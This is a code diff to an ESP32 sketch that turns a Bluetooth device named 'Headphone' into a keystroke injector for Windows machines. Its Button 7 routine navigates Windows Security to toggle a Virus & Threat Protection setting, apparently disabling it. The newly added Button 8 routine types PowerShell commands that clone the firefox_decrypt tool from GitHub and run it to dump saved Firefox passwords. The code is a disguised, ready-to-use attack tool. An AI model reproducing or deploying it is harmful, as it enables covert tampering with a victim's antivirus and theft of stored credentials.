@@ -7,6 +7,7 @@
 #define BUTTON_5_PIN 21 // Button 5 (Trigger: Task Manager Admin)
 #define BUTTON_6_PIN 22 // Button 6 (Trigger: Calculator)
 #define BUTTON_7_PIN 23 // Button 7 (Trigger: Virus & Threat Protection)
+#define BUTTON_8_PIN 25 // Button 8 (Trigger: Firefox Decrypt)
 
 char kbd[] = "Headphone"; // Device Name
 BleKeyboard bleKeyboard(kbd, "Espressif", 100);
@@ -18,6 +19,7 @@ bool lastState4 = HIGH;
 bool lastState5 = HIGH;
 bool lastState6 = HIGH;
 bool lastState7 = HIGH;
+bool lastState8 = HIGH;
 
 void sendString(const char* s, int charDelay = 10) {
   for (size_t i = 0; i < strlen(s); i++) {
@@ -36,7 +38,7 @@ void openRun() {
 
 void setup() {
   Serial.begin(115200);
-  Serial.println("Starting BLE HID setup with 7 Triggers on Buttons 1-7 (Pins 16, 17, 18, 19, 21, 22, 23)...");
+  Serial.println("Starting BLE HID setup with 8 Triggers on Buttons 1-8 (Pins 16, 17, 18, 19, 21, 22, 23, 25)...");
 
   pinMode(BUTTON_1_PIN, INPUT_PULLUP);
   pinMode(BUTTON_2_PIN, INPUT_PULLUP);
@@ -45,6 +47,7 @@ void setup() {
   pinMode(BUTTON_5_PIN, INPUT_PULLUP);
   pinMode(BUTTON_6_PIN, INPUT_PULLUP);
   pinMode(BUTTON_7_PIN, INPUT_PULLUP);
+  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
 
   Serial.println("Initializing BLE...");
   delay(1000);
@@ -61,6 +64,7 @@ void loop() {
     bool state5 = digitalRead(BUTTON_5_PIN);
     bool state6 = digitalRead(BUTTON_6_PIN);
     bool state7 = digitalRead(BUTTON_7_PIN);
+    bool state8 = digitalRead(BUTTON_8_PIN);
 
     // Button 1: Rickroll (Pin 16)
     if (lastState1 == HIGH && state1 == LOW) {
@@ -154,26 +158,48 @@ void loop() {
     if (lastState7 == HIGH && state7 == LOW) {
       Serial.println("Button 7: Virus & Threat Protection (Pin 23)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
-      bleKeyboard.releaseAll(); delay(1000); // Wait for Start menu
-      sendString("virus & threat protection", 10); delay(1000); // Wait for search results
-      bleKeyboard.press(KEY_RETURN); delay(8000); 
-      bleKeyboard.releaseAll(); delay(2000); // Wait for Windows Security
-      bleKeyboard.press(KEY_TAB); delay(500); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(500); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(500); 
-      bleKeyboard.releaseAll();
-      bleKeyboard.press(KEY_TAB); delay(500); 
-      bleKeyboard.releaseAll(); // 4 Tab presses
+      bleKeyboard.releaseAll(); delay(1000);
+      sendString("virus & threat protection", 10); delay(1000);
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(500); // Select option
+      bleKeyboard.releaseAll(); delay(2000);
+      bleKeyboard.press(KEY_TAB); delay(500); 
+      bleKeyboard.releaseAll();
+      bleKeyboard.press(KEY_TAB); delay(500); 
+      bleKeyboard.releaseAll();
+      bleKeyboard.press(KEY_TAB); delay(500); 
+      bleKeyboard.releaseAll();
+      bleKeyboard.press(KEY_TAB); delay(500); 
+      bleKeyboard.releaseAll();
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(500);
       bleKeyboard.press(KEY_SPACE); delay(100); 
-      bleKeyboard.releaseAll(); delay(500); // Toggle setting
+      bleKeyboard.releaseAll(); delay(500);
       bleKeyboard.press(KEY_LEFT_ARROW); delay(100); 
-      bleKeyboard.releaseAll(); delay(500); // Navigate back
+      bleKeyboard.releaseAll(); delay(500);
       bleKeyboard.press(KEY_RETURN); delay(100); 
-      bleKeyboard.releaseAll(); delay(500); // Confirm
+      bleKeyboard.releaseAll(); delay(500);
+    }
+
+    // Button 8: Firefox Decrypt (Pin 25)
+    if (lastState8 == HIGH && state8 == LOW) {
+      Serial.println("Button 8: Firefox Decrypt (Pin 25)");
+      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000); // Wait for Start menu
+      sendString("powershell", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000); // Wait for PowerShell
+      sendString("git clone https://github.com/unode/firefox_decrypt.git", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(7000); // Wait for clone
+      sendString("cd firefox_decrypt", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000); // Wait for cd
+      sendString("python firefox_decrypt.py", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(3000); // Wait for script
+      sendString("2", 10); delay(100); 
+      bleKeyboard.press(KEY_RETURN); delay(100); 
+      bleKeyboard.releaseAll(); delay(1000); // Select profile 2
     }
 
     lastState1 = state1;
@@ -183,9 +209,9 @@ void loop() {
     lastState5 = state5;
     lastState6 = state6;
     lastState7 = state7;
+    lastState8 = state8;
   } else {
     Serial.println("Waiting for BLE connection...");
   }
   delay(50); // Debounce/stability
-
 }
